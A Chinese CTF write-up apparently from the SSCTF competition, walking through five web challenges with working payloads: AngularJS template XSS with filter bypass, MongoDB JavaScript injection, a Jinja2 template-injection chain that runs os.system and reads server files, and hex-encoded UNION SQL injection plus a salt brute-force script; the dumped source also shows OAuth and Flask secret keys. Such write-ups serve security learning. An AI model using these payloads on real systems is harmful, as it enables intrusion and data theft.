效果： 
注：其实我觉得我的解法挺猥琐的...不知道是不是这道题目的正解,不过解出来就好... 
Web 
Web100(Up!Up!Up!) 
一个上传，研究了半天都没解决，什么常规的方法都试过了，能改的属性都改过了，最
后队友看了看包，来了句，可没可能在上传表单属性 Content-Type: multipart/form-data;那里
有个判断啊，瞬间觉得世界明亮了，于是就这么拿了 flag： 
Web200(Can You Hit Me？) 
Gg 了一篇文章： 
http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html 
，然后肯定是测试最新那个了—但发现过滤了 on、eval、alert 等字符，双写绕过。 
Payload： 
http://960a23aa.seclover.com/index.php?xss={{'a'.coonnstructor.prototype.charAt=[].join;$eveva
lal('x=1} } };aleralertt(/ssctf_Nu1L/)//');}} 
Web300(Legend？Legend) 
又是 MMD。。。。。。。。。。wooyun 的文章： 
http://drops.wooyun.org/tips/3939 
本来想测试下，结果貌似又被搅屎了，然后就报不了 js 错误直接跳回首页了，就拿最终的图
吧。 
然后就利用 return 构造，payload： 
http://806bddce.seclover.com/news.php?newsid=3%27});return%20{title:tojson(db.getCollection
Names()),password:2};//&password=test 
http://806bddce.seclover.com/news.php?newsid=3%27});return%20{title:tojson(db.user.find()[0]
)};//&password=test 
然后邮箱登录。。。我还问西瓜牛为啥没有 flag。。。 
翻了翻邮箱，找到~ 
Web400(Flag-Man) 
一开始以为是 cookie 哪里改成赵日天= == = == = == = = =无力吐槽，然后在乌云看到一篇文
章：http://drops.wooyun.org/web/13057 
点击题目的 login，发现 name 的 value 是你 github 账号名字，于是开了开脑洞， 
http://drops.wooyun.org/web/13057 POC 
{% for c in [].__class__.__base__.__subclasses__() %} 
{% if c.__name__ == 'catch_warnings' %} 
{{ c.__init__.func_globals['linecache'].__dict__['os'].system('id') }} 
{% endif %} 
{% endfor %} 
为了简短代码， 
{% for c in [].__class__.__base__.__subclasses__() %} {% if c.__name__ == 'catch_warnings' %} 
{{ loop.index0 }}{% endif %} {% endfor %} 
得到索引是 59 
# 循环查看所有的模块 发现有 os, __file__, __builtins__等，可以用 open 
{% 
for 
i 
in 
range(0, 
10) 
%} 
{{ [].__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].__dict__.keys()[i]
 }} {% endfor %} 
但是要先知道当前文件名，所以 
{{ [].__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].__dict__['os'].pa
th.realpath(__file__) }} 
得到文件名  ssctf.py，然后读文件 
{{ [].__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].__dict__['__built
ins__'].open("/data1/www/htdocs/259/4083475a59f34e34/2/ssctf.py", "r").read() }} 
得到 
name:# 
-*- 
coding: 
utf-8 
-*- 
from 
flask 
import 
Flask,abort,request,session,redirect,render_template_string import os import json import 
datetime import urllib import re import time import hashlib #import sqlite3 import threading from 
rauth.service import OAuth2Service BASE_DIR = os.path.dirname(os.path.abspath(__file__)) 
DEBUG = os.name =='nt' if DEBUG: WEBHOME = 'http://127.0.0.1/' else: WEBHOME = 
'http://b525ac59.seclover.com/' 
github 
= 
OAuth2Service( 
name='github', 
base_url='https://api.github.com/', 
access_token_url='https://github.com/login/oauth/access_token', 
authorize_url='https://github.com/login/oauth/authorize', client_id= '6ad5ab3c971c740adf64', 
client_secret= 'd6aed929c3b9bf713a37435c117619dcd46194e1', ) app = Flask(__name__) 
app.debug 
= 
DEBUG 
app.secret_key 
= 
"sflkgjsiotu2rjdskjfnpwq9rwrehnpqwd0i2ruruogh9723yrhbfnkdsjl" 
app.flagman 
= 
(1,'flagman','SSCTF{dc28c39697058241d924be06462c2040}','http://www.seclover.com/wp-
content/uploads/2015/07/logo.png') # app.lastid = 1 # app.lock = threading.Lock() # def getnewid(): 
# app.lock.acquire() # app.lastid+=1 # newid = app.lastid # app.lock.release() # return newid # def 
dbinsert(name,uid,pic): # newid = getnewid() # app.user[newid] = (name,uid,pic) # return newid # 
def dbfind(user_id): # userinfo = app.user.get(user_id) # if userinfo: # return (user_id,)+userinfo # 
return None # def dbfind_uid(uid): # for u in app.user: # if app.user[u][1]==uid: # return 
(u,)+app.user[u] 
# 
return 
None 
# 
app.dbcon 
= 
sqlite3.connect(":memory:", 
check_same_thread=False) # app.dbcur = app.dbcon.cursor() # app.dbcur.executescript('''CREATE 
TABLE "user" ( # "id" INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, # "name" TEXT, # "uid" 
TEXT, # "pic" TEXT # ) # ; # CREATE UNIQUE INDEX "id" # ON "user" ("id" ASC); # CREATE UNIQUE 
INDEX "uid" # ON "user" ("uid" ASC); # ''') # def dbinsert(name,uid,pic): # sql = '''INSERT INTO "user" 
("name", 
"uid", 
"pic") 
VALUES 
(?,?,?);''' 
# 
app.dbcur.execute(sql,(name,uid,pic)) 
# 
app.dbcon.commit() # return app.dbcur.lastrowid # def dbfind(user_id): # sql = '''SELECT * FROM 
"user" where id = ?''' # rows = app.dbcur.execute(sql,(user_id,)) # for id,name,realuid,pic in rows: 
# 
return 
(id,name,realuid,pic) 
# 
return 
None 
# 
dbinsert('howmp','uid','http://www.seclover.com/wp-content/uploads/2015/07/logo.png') 
@app.route('/user/') def user(): userinfo = session.get('info') if not userinfo: #session.pop('info') 
return "please login first. 
Powered 
by 
Flask/0.11.2" 
user_id,name,realuid,pic 
= 
userinfo 
if 
user_id 
== 
1: 
user_id,name,realuid,pic = app.flagman name = str(name) pic = str(pic) template = u''' 
name:''' + name + ' 
uid:{{ realuid }} 
id:{{ user_id }}' #template += u" 
{{app.secret_key}}" 
return 
render_template_string(template,**(dict(globals(), 
**locals()))) 
@app.route('/') def index(): def _link(): params = {'redirect_uri': WEBHOME+'callback'} icon = u'' 
return """ 
%s 
""" % (github.get_authorize_url(**params), icon) html = """ %slogin 
only / and /user,no other pages! """ % _link() return html @app.route('/callback') def callback(): 
code = request.args.get('code') if not code: abort(401) data = dict(code=request.args['code'], 
redirect_uri=WEBHOME+'callback', ) try: auth = github.get_auth_session(data=data) me = 
auth.get('user').json() 
session['info']=[2,me['name'],me['id'],me['avatar_url']] 
return 
redirect('/user/') 
except 
Exception,e: 
return 
e 
if 
__name__ 
== 
'__main__': 
app.run(host='0.0.0.0',port=80) 
因为最后没截图了，就拿这当吧，当时拿到 py 源码发现有 app.flagman- -改 github 昵称，利
用 http://www.tuicool.com/articles/mANBvmJ 文章中的{{…….}}进行绕过： 
访问下就行了： 
Web500(AFSRC-Market)-----比赛时未作出来，赛后做 
比赛时没有发现给的 hint 竟然还有一个单词叫 is_number，明显的是这个
函数造成的过滤不严格，使得恶意数据通过十六进制插入数据库造成二次注
入，代码的话首先测试的是 904 and 1=1，构造 payload 为
http://edb24e7c.seclover.com/add_cart.php?id=0x39303420616e6420313d31
，访问之后再 http://edb24e7c.seclover.com/userinfo.php 的 myinfo 下发现
了 money
尝试 904 and 1=0，money 变为
，
报错，直接确定注入。之后就是盲注了。。。盲注的话也是有技巧的，首先爆
数据库名，构造 904 and 1=0 union select 1,2,SCHEMA_NAME,4 from 
information_schema.SCHEMATA limit 1,1;#，得到 payload 为
http://edb24e7c.seclover.com/add_cart.php?id=0x39303420616e6420313d30
20756e696f6e2073656c65637420312c322c534348454d415f4e414d452c342066726
f6d20696e666f726d6174696f6e5f736368656d612e534348454d415441206c696d69
7420312c313b23，得到数据库名
，然后查表，构造
http://edb24e7c.seclover.com/add_cart.php?id=0x904 and 1=0 union 
select 1,2,table_name,4 from information_schema.tables where 
table_schema='web05';#得到 flag 表，爆字段数，构造 904 and 1=0 union 
select 1 from flag #，依次 select 1 select1,2，发现在 select 1,2,3,4
的时候
money 为 3，所以，得出结论，flag 表有四个字段，其中
第三个字段上有东西，根据经验把目标锁定在 flag，于是构造 904 and 1=0 
union select 1,2,flag,4 from flag #，得到的 payload 为
http://edb24e7c.seclover.com/add_cart.php?id=0x39303420616e6420313d30
20756e696f6e2073656c65637420312c322c666c61672c342066726f6d20666c61672
023，之后发现
，于是访问
http://edb24e7c.seclover.com/2112jb1njIUIJ__tr_R/tips.txt 得到 tips: 
1、Congratulations for you !You finished 80%,Come on continue! 
2、token=md5(md5(username)+salt) salt max lenght is 5(hexs) 
3、Add the Money Get the Flag 
提示很明显了，根据提示，得到自己 token 然后爆破就可以了 
首先找到表名，
http://edb24e7c.seclover.com/add_cart.php?id=0x39303420616e6420313d3020756e696f6e207
3656c65637420312c322c7461626c655f6e616d652c342066726f6d20696e666f726d6174696f6e5
f736368656d612e7461626c6573207768657265207461626c655f736368656d613d277765623035
27206c696d697420312c313b23，构造 payload，得到 user 表，构造 payload 为 904 and 1=0 
union select 1,2,token,4 from user  where username ='Albertchang' #，访问
http://edb24e7c.seclover.com/add_cart.php?id=0x39303420616e6420313d3020756e696f6e207
3656c65637420312c322c746f6b656e2c342066726f6d2075736572202077686572652075736572
6e616d65203d27416c626572746368616e67272023 后在 money 得到自己的 token：
4e35baffcafd958795c0efed53bfb080，然后写个脚本爆破首先对自己的用户名 Albertchang 进
行 md5 为 18dda757bd3c9977b65d519a3cb81fbc，然后写脚本，补上一到五个字符进行 md5 
import hashlib 
def md5(str): 
    import hashlib 
    m = hashlib.md5() 
    m.update(str) 
    return m.hexdigest() 
li = [] 
s = '18dda757bd3c9977b65d519a3cb81fbc' 
chars = 
['0','1','2','3','4','5','6','7','8','9','a','b','c','d',
'e','f'] 
for i in chars : 
    li.append(s+i) 
for i in chars : 
    for j in chars : 
        li.append(s+i+j) 
for i in chars : 
    for j in chars : 
        for k in chars : 
            li.append(s+i+j+k) 
for i in chars : 
    for j in chars : 
        for k in chars : 
            for l in chars : 
                li.append(s+i+j+k+l) 
for i in chars : 
    for j in chars : 
        for k in chars : 
            for l in chars : 
                for m in chars : 
                    li.append(s+i+j+k+l+m) 
for i in li : 
    if md5(i) == '4e35baffcafd958795c0efed53bfb080' : 
        print i 
得到 18dda757bd3c9977b65d519a3cb81fbc8b76d，所以 salt 是 8b76d。之后 addmoney，
burp 抓包改一下 salt 在 forward 就得到 flag 了
最后，感谢四叶草的@kun@line@zhao 瓜皮等辛勤的工作人员，给我们带来了一场精彩的比
赛，让我们也学到了很多东西，同时也鄙视一下一直在搅屎 web300 那个注入的脑残。。。。。